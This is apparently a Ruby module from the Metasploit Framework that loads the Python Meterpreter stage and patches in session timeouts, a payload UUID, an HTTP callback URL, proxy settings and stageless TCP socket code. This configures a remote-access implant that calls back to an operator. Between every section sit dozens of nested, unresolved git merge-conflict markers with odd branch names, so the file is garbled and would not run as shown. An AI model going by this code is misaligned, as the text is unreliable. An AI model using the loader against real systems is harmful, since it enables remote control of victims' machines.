# -*- coding: binary -*-

require 'msf/core'
require 'msf/base/sessions/meterpreter_options'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Common module stub for ARCH_PYTHON payloads that make use of Meterpreter.
#
###

module Payload::Python::MeterpreterLoader

  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Meterpreter & Configuration',
      'Description'   => 'Run Meterpreter & the configuration stub',
      'Author'        => [ 'Spencer McIntyre' ],
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Stager'        => {'Payload' => ""}
    ))

    register_advanced_options([
      OptBool.new('PythonMeterpreterDebug', [ true, 'Enable debugging for the Python meterpreter', false ])
    ], self.class)
  end

  # Get the raw Python Meterpreter stage and patch in values based on the
  # configuration
  #
  # @param opts [Hash] The options to use for patching the stage data.
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
>>>>>>> origin/pod/metasploit-framework
=======
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
  # @option opts [String] :http_proxy_host The host to use as a proxy for
  #   HTTP(S) transports.
  # @option opts [String] :http_proxy_port The port to use when a proxy  host is
  #   set for HTTP(S) transports.
  # @option opts [String] :http_url The HTTP(S) URL to patch in to
  #   allow use of the stage as a stageless payload.
  # @option opts [String] :http_user_agent The value to use for the User-Agent
  #   header for HTTP(S) transports.
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/4.11.2_release_pre-rails4
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======
>>>>>>> origin/pod/metasploit-framework
=======
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
<<<<<<< HEAD
=======
>>>>>>> pod/metasploit-gemfile-
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
=======
>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader
=======
>>>>>>> origin/pod/metasploit-gemfile-
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> origin/4.11.2_release_pre-rails4
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
  # @option opts [String] :stageless_tcp_socket_setup Python code to execute to
  #   setup a tcp socket to allow use of the stage as a stageless payload.
  # @option opts [String] :uuid A specific UUID to use for sessions created by
  #   this stage.
  def stage_meterpreter(opts={})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.py')

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
>>>>>>> origin/pod/metasploit-framework
=======
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
    var_escape = lambda { |txt|
      txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
    }

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/4.11.2_release_pre-rails4
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======
>>>>>>> origin/pod/metasploit-framework
=======
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
<<<<<<< HEAD
=======
>>>>>>> pod/metasploit-gemfile-
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
=======
>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader
=======
>>>>>>> origin/pod/metasploit-gemfile-
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> origin/4.11.2_release_pre-rails4
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
    if datastore['PythonMeterpreterDebug']
      met = met.sub("DEBUGGING = False", "DEBUGGING = True")
    end

    met.sub!('SESSION_EXPIRATION_TIMEOUT = 604800', "SESSION_EXPIRATION_TIMEOUT = #{datastore['SessionExpirationTimeout']}")
    met.sub!('SESSION_COMMUNICATION_TIMEOUT = 300', "SESSION_COMMUNICATION_TIMEOUT = #{datastore['SessionCommunicationTimeout']}")
    met.sub!('SESSION_RETRY_TOTAL = 3600', "SESSION_RETRY_TOTAL = #{datastore['SessionRetryTotal']}")
    met.sub!('SESSION_RETRY_WAIT = 10', "SESSION_RETRY_WAIT = #{datastore['SessionRetryWait']}")

    uuid = opts[:uuid] || generate_payload_uuid
    uuid = Rex::Text.to_hex(uuid.to_raw, prefix = '')
    met.sub!("PAYLOAD_UUID = \'\'", "PAYLOAD_UUID = \'#{uuid}\'")

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
>>>>>>> origin/pod/metasploit-framework
=======
=======
>>>>>>> origin/pod/metasploit-serialized_class_loader
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
    # patch in the stageless http(s) connection url
    met.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(opts[:http_url])}'") if opts[:http_url].to_s != ''
    met.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(opts[:http_user_agent])}'") if opts[:http_user_agent].to_s != ''

    if opts[:http_proxy_host].to_s != ''
      proxy_url = "http://#{opts[:http_proxy_host]}:#{opts[:http_proxy_port]}"
      met.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
    end

<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
>>>>>>> origin/4.11.2_release_pre-rails4
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
=======
>>>>>>> origin/pod/metasploit-framework
=======
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> origin/pod/metasploit-api/_index.html
=======
=======
>>>>>>> 4.11.2_release_pre-rails4
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> 4.11.2_release_pre-rails4
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
<<<<<<< HEAD
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
=======
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> msf-complex-payloads
=======
>>>>>>> payload-generator.rb
<<<<<<< HEAD
=======
>>>>>>> pod/metasploit-gemfile-
>>>>>>> pod/metasploit-inject.vcxproj.filters-master_0
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> chore/MSP-12110/celluloid-supervision-tree
>>>>>>> origin/pod/metasploit-framework
=======
>>>>>>> rapid7/master
>>>>>>> origin/pod/metasploit-serialized_class_loader
=======
>>>>>>> origin/pod/metasploit-gemfile-
=======
>>>>>>> origin/pod/metasploit-windows.rb
=======
>>>>>>> origin/4.11.2_release_pre-rails4
=======
>>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
=======
>>>>>>> origin/msf-complex-payloads
=======
>>>>>>> origin/payload-generator.rb
=======
=======
>>>>>>> msf-complex-payloads
>>>>>>> origin/pod/metasploit-api/_index.html
=======
>>>>>>> origin/pod/metasploit-excellent.mp3
    # patch in any optional stageless tcp socket setup
    unless opts[:stageless_tcp_socket_setup].nil?
      socket_setup = opts[:stageless_tcp_socket_setup]
      socket_setup = socket_setup.split("\n")
      socket_setup.map! {|line| "\t\t#{line}\n"}
      socket_setup = socket_setup.join
      met.sub!("\t\t# PATCH-SETUP-STAGELESS-TCP-SOCKET #", socket_setup)
    end

    met
  end

end

end
